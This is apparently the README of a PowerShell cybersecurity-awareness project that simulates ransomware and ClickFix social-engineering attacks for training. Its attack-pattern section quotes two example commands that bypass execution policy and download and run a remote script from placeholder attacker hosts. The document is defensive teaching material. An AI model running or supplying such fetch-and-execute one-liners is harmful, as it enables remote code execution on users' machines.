# Simalicious - Cybersecurity Training Scripts

PowerShell scripts that simulate malicious activity for cybersecurity awareness training. These scripts demonstrate common attack patterns without causing actual harm.

## ⚠️ IMPORTANT DISCLAIMER

**THESE SCRIPTS ARE FOR EDUCATIONAL AND TRAINING PURPOSES ONLY**

- No files are actually encrypted or harmed
- No real malicious activity occurs
- All actions are simulated for learning
- Do not use these scripts for illegal purposes
- Always run in controlled training environments

## 🎯 Training Scenarios

### Phishing & ClickFix Attacks
These scripts simulate the PowerShell-based attacks commonly delivered through:
- Phishing emails with malicious attachments
- "ClickFix" social engineering (fake error messages)
- Malicious websites instructing users to run PowerShell commands
- Tech support scams

## 📁 Files Included

### `simalicious.ps1` - Main Simulation Script
The comprehensive malware simulation that demonstrates:
- System reconnaissance and information gathering
- File discovery and targeting
- Fake encryption process with progress indicators
- Ransomware note creation
- Persistence mechanism simulation
- Command & Control (C2) communication simulation
- Anti-analysis techniques

**Usage:**
```powershell
# Basic execution
.\simalicious.ps1

# Verbose mode (shows detailed operations)
.\simalicious.ps1 -Verbose

# Quick mode (faster execution for demos)
.\simalicious.ps1 -QuickMode
```

### `launcher.ps1` - Invoke-Expression Demonstration
Shows how attackers use `Invoke-Expression` (IEX) to execute remote scripts. Demonstrates the exact patterns used in real phishing attacks.

**Usage:**
```powershell
.\launcher.ps1
```

### `web-version.ps1` - Remote Fetch Simulation
A simplified version designed to demonstrate remote script execution patterns.

## 🚨 Common Attack Patterns Demonstrated

### 1. Win+R ClickFix Pattern
Attackers often instruct victims to:
1. Press `Windows + R` to open Run dialog
2. Paste a malicious PowerShell command
3. Press Enter to execute

**Example malicious commands (DO NOT RUN):**
```powershell
powershell -ep bypass -c "iex (iwr 'https://malicious.com/script.ps1').Content"
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://evil.com/payload.ps1' -UseBasicParsing).Content"
```

### 2. Execution Policy Bypass
Notice how attackers bypass PowerShell security:
- `-ExecutionPolicy Bypass` or `-ep bypass`
- `-Command` or `-c` for one-liner execution
- `Invoke-Expression` to execute downloaded code

### 3. Remote Code Execution
- Scripts hosted on compromised or malicious websites
- Use of `Invoke-WebRequest` (iwr) to download
- Immediate execution without file inspection

## 🛡️ Training Value

This simulation helps learners understand:

### Attack Techniques
- How malware gathers system information
- File discovery and targeting methods
- Encryption simulation and ransom demands
- Persistence and stealth techniques
- Command and control communication

### Social Engineering
- ClickFix attack methodology
- PowerShell-based delivery mechanisms
- Urgency and fear tactics in ransom notes
- Technical instruction obfuscation

### Detection Opportunities
- Suspicious PowerShell execution patterns
- Network communication indicators
- File system changes and artifacts
- Registry and persistence modifications

## 🔧 Training Environment Setup

### Prerequisites
- Windows system with PowerShell 5.0+
- Ability to run PowerShell scripts
- Controlled/isolated training environment

### Execution Policy
You may need to temporarily allow script execution:
```powershell
# Check current policy
Get-ExecutionPolicy

# Allow for current session (safer)
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process

# Or allow for current user
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

### Running the Simulation
1. Download the scripts to a training directory
2. Open PowerShell as a regular user (not administrator)
3. Navigate to the script directory
4. Execute the desired script

## 🧹 Cleanup

The simulation creates temporary files for realism:

### Automatic Cleanup Locations
- Temp directory: `%TEMP%\simalicious_training\`
- Desktop ransom note: `Desktop\README_SIMALICIOUS_TRAINING.txt`
- Additional temp files in `%TEMP%`

### Manual Cleanup
```powershell
# Remove simulation artifacts
Remove-Item "$env:TEMP\simalicious_training" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:USERPROFILE\Desktop\README_SIMALICIOUS_TRAINING.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\YOUR_FILES_ARE_ENCRYPTED.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\TRAINING_RANSOM_NOTE.txt" -Force -ErrorAction SilentlyContinue
```

## 🎓 Learning Objectives

After running these simulations, participants should understand:

1. **Attack Recognition**: How to identify suspicious PowerShell commands
2. **Social Engineering**: How ClickFix and similar attacks work
3. **Technical Indicators**: What malware behavior looks like
4. **Prevention**: Why execution policies and user awareness matter
5. **Response**: How to contain and analyze potential incidents

## 🔒 Security Notes

- **Isolated Environment**: Always run in controlled lab environments
- **Network Isolation**: Consider disconnecting from production networks
- **User Education**: Clearly explain this is simulation to all participants
- **Monitoring**: Use these scripts to test security monitoring capabilities
- **Documentation**: Record all training activities for compliance

## 📚 Additional Resources

### Real-World Examples
- ClickFix campaigns targeting users with fake browser errors
- Phishing emails with PowerShell-based payloads
- Tech support scams using similar techniques

### Detection and Prevention
- PowerShell logging and monitoring
- Execution policy hardening
- User awareness training programs
- Email security and filtering
- Endpoint detection and response (EDR)

---

**Remember**: The best defense against these attacks is user education and technical controls working together!
